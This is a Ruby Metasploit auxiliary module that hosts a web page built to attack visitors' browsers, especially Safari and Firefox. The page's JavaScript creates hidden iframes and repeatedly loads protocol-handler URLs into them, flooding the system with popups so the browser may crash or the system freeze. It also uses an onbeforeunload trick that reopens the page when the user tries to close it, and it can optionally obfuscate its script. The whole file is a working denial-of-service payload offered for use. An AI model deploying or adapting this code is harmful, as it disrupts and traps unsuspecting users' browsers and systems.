require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpServer::HTML
	def initialize(info = {})
		super(update_info(info,
			'Name'			=>		'Multi browser web-based protocol handler iframe annoyance/DoS',
			'Description'	=>		%q{
				This takes advantage of web-based protocol handlers in certain browsers (esp. Safari)
				to open excessive popups and consume system resources. In some cases the browser may
				crash or the system may become frozen. Succesfully tested on the lastest versions of Safari and 
				FireFox. Known not to work on Chromium or Chrome. Not tested on any versions of IE or Opera.
			},
			'Author'		=>		'Tesla',
			'License'		=>		MSF_LICENSE,
			'Actions'     =>
        [
          [ 'WebServer' ]
        ],
      'PassiveActions' =>
        [
          'WebServer'
        ],
      'DefaultAction'  => 'WebServer'))

	register_options(
		[
			OptBool.new('OBFUSCATE_JS', [false, 'Obfuscate the javascript', false]),
			OptInt.new('DELAY', [true, 'Time to wait in between refreshing frame sources', 200]),
			OptString.new('TITLE', [false, 'The title of the page', 'Lulz. . .']),
			OptString.new('BODY', [false, 'The body of the page', '<h1>Oops.</h1>']),
			OptString.new('BEFORE_UNLOAD_PROMPT', [false, 'The text in the alert displayed when the user attempts to close the window', 'Not so fast. . .']),
			OptString.new('PROTOCOLS', [false, 'Protocol URLs to use separated by commas', 'ssh://root@www.assignlink.com, ftp://anonymous@mozilla.org, mailto://tesla@google.com, rss://seclists.org/rss/fulldisclosure.rss, callto://sabu']),
			OptString.new('URIPATH', [false, 'Path of URI on server to html page (default is random)'])
		]
		)
	end

	def run
		@page_source = gen_page
		print_status("Generated HTML document")
		exploit
	end

	def on_request_uri(cli, request)
		print_status("Sending malicious document to #{cli.peerhost}. . .")
		send_response(cli, @page_source)
	end

	def gen_page
		pg_src = "<!DOCTYPE html><html><head><meta charset='utf-8'><title>#{datastore['title']}</title><script type='text/javascript'>#{gen_js}</script></head><body>#{datastore['BODY']}</body></html>"
		return pg_src
	end

	def gen_js
		protocols = datastore['PROTOCOLS'].split(",").map(&:strip)
		framenames = []
		protocols.length.downto 1 do |i|
			framenames << "frame_%d" % i
		end
		orig_js = %Q|
			function flood(src_str, id_str) {
				(function() {
      				var f = document.getElementById(id_str);
        			var w = 0;
        			var ivl = window.setInterval(function(){
          			f.src = src_str;
          			if (w++ > 200) clearInterval(ivl);
        		}, 1);
    		})();
			}
			function floodAll() {
				#{
					finaljs = ''
					protocols.zip(framenames).each do |p,fn|
						finaljs << 'flood("' << p << '", "' << fn << '");'
					end
					finaljs
				}
			}
			function generateFrames() {
				#{
					frameCode = ''
					framenames.each do |fn|
						frameCode << 'var %s = document.createElement("iframe");' % fn
						frameCode << "\n"
						frameCode << '%s.id = "%s";' % [fn,fn]
						frameCode << "\n"
						frameCode << '%s.src = "about:blank";' % fn
						frameCode << "\n"
						frameCode << '%s.style = "position:fixed;left:-500px;top:-500px;width:1px;height:1px;";' % fn
						frameCode << "\n"
						frameCode << 'document.body.appendChild(%s);' % fn
						frameCode << "\n"
					end
					frameCode
				}
			}
			function doItAll() {
				window.onbeforeunload=function(){window.open(document.URL);return "#{datastore['BEFORE_UNLOAD_PROMPT']}";};
				generateFrames();
				floodAll();
			}
			window.onload = doItAll;
		|
		if datastore['OBFUSCATE_JS']
			return obfuscate_js(orig_js,
				'Symbols' => {
			 		'Variables' => framenames << ['f', 'w', 'ivl'],
		 			'Methods'	=> ['doItAll', 'generateFrames', 'floodAll', 'flood']
		 		},
		 		'Strings' => true
		 		)
		else
			return orig_js
		end
	end
end